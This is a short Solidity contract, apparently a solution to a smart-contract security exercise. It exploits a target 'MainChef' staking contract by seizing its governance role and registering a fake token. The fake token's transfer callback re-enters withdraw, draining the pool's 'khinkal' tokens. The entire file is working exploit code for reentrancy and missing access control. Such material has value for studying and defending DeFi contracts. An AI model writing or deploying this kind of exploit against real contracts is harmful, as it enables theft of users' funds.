pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IChef {
    function withdraw(uint256 _pid) external;
    function setGovernance(address _governance) external;
    function addToken(IERC20 _lpToken) external;
    function deposit(uint256 _pid,uint256 _amount) external;
}

contract MainChefAttackerLP {

    IChef mainChef;
    uint256 state;

    constructor(address _mainChef) public {
        mainChef = IChef(_mainChef);
    }

    function attackSetup() public {
        mainChef.setGovernance(address(this));
        mainChef.addToken(IERC20(address(this)));
    }

    function deposit() public {
        mainChef.deposit(1,1_000);
    }

    // @dev call to withdraw(..) to drain khinkal tokens
    function startAttack() public {
        state=1000;
        mainChef.withdraw(1);
    }

    // @dev single recursive call to withdraw function
    function transfer(address receiver, uint256 amount) public {
        if (state != 0) {
            state=0;
            mainChef.withdraw(1);
        }
    }

    function transferFrom(address sender, address receiver, uint256 amount) public {
    }

    function balanceOf(address sender) public returns (uint256) {
        return state;
    }

}